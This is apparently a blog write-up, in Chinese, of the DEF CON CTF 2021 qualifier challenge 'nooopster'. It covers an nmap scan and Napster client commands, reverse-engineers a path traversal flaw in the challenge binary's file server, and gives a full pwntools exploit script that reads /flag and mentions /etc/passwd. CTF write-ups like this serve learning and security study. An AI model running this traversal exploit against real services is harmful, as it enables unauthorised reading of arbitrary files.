---
title: defcon ctf 2021 quals - nooopster
date: 2022-01-23 05:31:09
tags:
- defcon ctf 2021 quals
- pwn
---

# nooopster

![](BT4KL7X.png)

![](Z1zFFtl.png)

![](8tJ74WV.png)

## 偵蒐階段

進入內網後對 **192.168.5.1** 進行掃描。得到以下結果

```
Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-23 06:08 CST
Nmap scan report for 192.168.5.1
Host is up (0.011s latency).

PORT     STATE SERVICE         VERSION
7070/tcp open  napster         MLDonkey multi-network P2P client
8888/tcp open  sun-answerbook?

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.47 seconds

```

跟這兩個 port 進行互動沒得到什麼資訊，拿 **napster** 這個字眼跟題目很像的名字進行搜尋，發現這個 [client](http://nap.sourceforge.net/) ，載下來後跟 port 7070 互動，但發現沒有效果，嘗試用一樣的程式跟 port 8888 互動得到了響應。[Linux Napster Client: User Guide](http://nap.sourceforge.net/userguide.html) 這裡提供跟 napster server 互動的所有指令。

![](62rKHoR.png)

以下我執行了這些指令。

```bash
# 列出所有頻道
/clist

# 進入 chat 頻道
/join #chat

# 列出 nooopster 這個用戶提供的檔案清單
/browse nooopster
```

清單中有一個非 mp3 的檔案，載下來之後發現這是一隻 elf 格式的程式。我們開始嘗試逆它。

![](Jbt611q.png)

## 逆向

分析整體流程可以大約分為以下幾個階段: 

1. 連線到 127.0.0.1:8888 ， 並且檢查 napser server 上有沒有 **nooopster** 這個用戶，若沒有的話，以 **nooopster** 為用戶名登入。
2. 創建一條 thread 並且在裡面創建 data server (負責用來上傳檔案到 nooopster server 或是讓其他用戶直接下載檔案) 在 0.0.0.0:7070 監聽。
   1. 收到用戶連線後，創建一條 thread 負責處理此用戶的請求，先檢查用戶是否在下載請求的清單中，如果在的話，接者檢查要求的檔案名稱是否以字串 **"\shared\\"** 作為開頭，若通過檢查，接者會把字串 **"\shared\\"** 以後檔案名稱作為字串傳入 `open` 中。例如用戶要求下載 **"\shared\\/etc/passwd"**，則最後得到的結果會是 `open("/etc/passwd","r")`。 這裡很明顯有**路徑穿越的漏洞**，可以利用這個漏洞去讀 **"/flag"**。
3. main thread 接者會不斷的重複傳送幾條提示用的訊息到 napster server 中的頻道 chat 中，以及接收來自 napster server 的檔案下載請求 ( 其他用戶的下載請求 )，這裡不做任何檢查，**直接把用戶名加入下載請求的清單中**。



分析完後可以很明顯的發現，這是一隻根據 napster 的 protocol 實作出來的簡易 client，且帶有**路徑穿越的漏洞**，讓我們能夠下載任意檔案。

## 利用腳本

詳細的 protocol 細節在逆向 nooopster 這支 binary 的時候，有搜尋到對應的 [specification](http://opennap.sourceforge.net/napster.txt)，照著上面內容實作跟 server 互動的封包即可。

```python
from pwn import *
import ipaddress

user = "test"
def to_nap_format(opcode, content):
    return p16(len(content)) + p16(opcode) + content

def nap_msg_send(s, opcode, content):
    s.send(to_nap_format(opcode, content))

def nap_msg_recv(s):
    tmp = s.recvn(4, timeout = 0.5)
    if not tmp:
        return None  
    n = u16(tmp[:2])
    opcode = u16(tmp[2:])
    
    return {"op": opcode, "data":s.recvn(n)}

nap_server = remote("192.168.5.1", 8888)

# 檢查 napster server 上是否有這個用戶名
nap_msg_send(nap_server, 7, user.encode())
msg = nap_msg_recv(nap_server)
print(msg)

# 登入伺服器
nap_msg_send(nap_server, 2, f"{user} test 0 \"nap v0.8\" 3".encode())
msg = nap_msg_recv(nap_server)
print(msg)

# 接收一些伺服器資訊
while 1:
    msg = nap_msg_recv(nap_server)
    if not msg:
        break

# 請 napster server 向 nooopster 請求我們下載檔案的請求
nap_msg_send(nap_server, 203, b"nooopster \"\\shared\\nooopster\"") 
msg = nap_msg_recv(nap_server)
print(msg)
tmp = msg["data"].split(b' ')

# nooopster 接受下載後 napster server 會回覆我們 nooopster's 的 data server 的地址和端口
ip = str(ipaddress.IPv4Address(u32(p32(int(tmp[1])), endian = "big")))
port = int(tmp[2])

# 直接觸發路徑穿越漏洞去讀取 flag
data_server = remote(ip, port)
print(data_server.recv())
target_file = "/flag"
data_server.send(f"GET{user} \"\\shared\\{target_file}\" 0".encode())

print(data_server.recvall().decode())
nap_server.close()
data_server.close()
```



# resource 

[Linux Napster Client: User Guide](http://nap.sourceforge.net/userguide.html#4.2.)

[napster protocol](http://opennap.sourceforge.net/napster.txt)
